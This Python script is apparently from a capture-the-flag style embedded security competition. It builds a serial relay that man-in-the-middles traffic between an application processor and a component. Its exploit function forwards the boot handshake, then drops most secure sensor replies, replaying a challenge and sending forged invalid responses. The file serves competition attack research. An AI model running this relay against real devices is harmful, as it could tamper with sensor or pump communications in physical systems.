import argparse
import serial
from pwn import *

SEND = 0
RECV = 1

class Relay:
    def __init__(self, comp_id):
        self.debug = False

        parser = argparse.ArgumentParser(
            prog="b01lers relay",
            description="Acts as a relay between the ap and component, allowing man in the middle attacks in a python script"
        )

        parser.add_argument(
            "-a",
            "--application-processor",
            required=True,
            help="Serial device of AP relay (which talks to real component)"
        )
        parser.add_argument(
            "-c",
            '--component',
            required=True,
            help="Serial device of Component relay (which talks to real ap)"
        )

        args = parser.parse_args()

        self.ap = serial.Serial(
            port=args.application_processor,
            baudrate=115200,
            parity=serial.PARITY_NONE,
            stopbits=serial.STOPBITS_ONE,
            bytesize=serial.EIGHTBITS,
        )

        self.comp = serial.Serial(
            port=args.component,
            baudrate=115200,
            parity=serial.PARITY_NONE,
            stopbits=serial.STOPBITS_ONE,
            bytesize=serial.EIGHTBITS,
        )

        self.comp_id = comp_id

        # tel ap relay id to talk to
        self.ap.write(p32(comp_id))

        # tell component relay its id
        self.comp.write(p32(comp_id))

    def recv(self, ser):
        ser.write(p8(RECV))
        len = u8(ser.read(size=1))
        return ser.read(size=len)

    def send(self, ser, data):
        ser.write(p8(SEND))
        ser.write(p8(len(data)))
        ser.write(data)

        # wait for ack byte
        _ack = ser.read(size=1)

    # receives bytes from the ap
    def recv_from_ap(self):
        out = self.recv(self.comp)

        if self.debug:
            print(f"from ap: {out}")

        return out

    # sends bytes from the ap
    def send_to_ap(self, data):
        if self.debug:
            print(f"to ap: {data}")

        self.send(self.comp, data)

    # receives bytes from the component
    def recv_from_comp(self):
        out = self.recv(self.ap)

        if self.debug:
            print(f"from c: {out}")

        return out

    # sends bytes from the component
    def send_to_comp(self, data):
        if self.debug:
            print(f"to c: {data}")
        self.send(self.ap, data)

    def forward_to_ap(self):
        data = self.recv_from_comp()
        self.send_to_ap(data)

    def forward_to_comp(self):
        data = self.recv_from_ap()
        self.send_to_comp(data)


def hide_forward_to_comp(relay):
    relay.forward_to_comp()
    relay.forward_to_ap()
    relay.forward_to_comp()

def hide_forward_to_ap(relay):
    relay.forward_to_ap()
    relay.forward_to_comp()
    relay.forward_to_ap()

challenge_replay = b''
invalid_request = b'\xff' * 0x80

def drop_comp_to_ap_secure_message(relay):
    # drop component message
    component_message = relay.recv_from_comp()
    relay.send_to_comp(challenge_replay)
    relay.recv_from_comp()

    # send back component invalid challenge response
    relay.send_to_ap(invalid_request)
    
# put your exploit code in this function
def exploit():
    relay = Relay(0x1111125)

    # forward boot ping
    hide_forward_to_comp(relay)
    # forward boot pong
    hide_forward_to_ap(relay)
    # forward boot confirm
    hide_forward_to_comp(relay)
    # forward boot message
    hide_forward_to_ap(relay)

    # at this point design should be booted

    # ap will ask component if it is sensor or pump
    hide_forward_to_comp(relay)
    hide_forward_to_ap(relay)

    # now ap will poll for data, and component will reply
    i = 0
    while True:
        # forward message teling component we want sensore data
        hide_forward_to_comp(relay)
        # temp index
        if (i % 10) != 4:
            # drop packet
            drop_comp_to_ap_secure_message(relay)
        else:
            hide_forward_to_ap(relay)

        i += 1


if __name__ == "__main__":
    exploit()
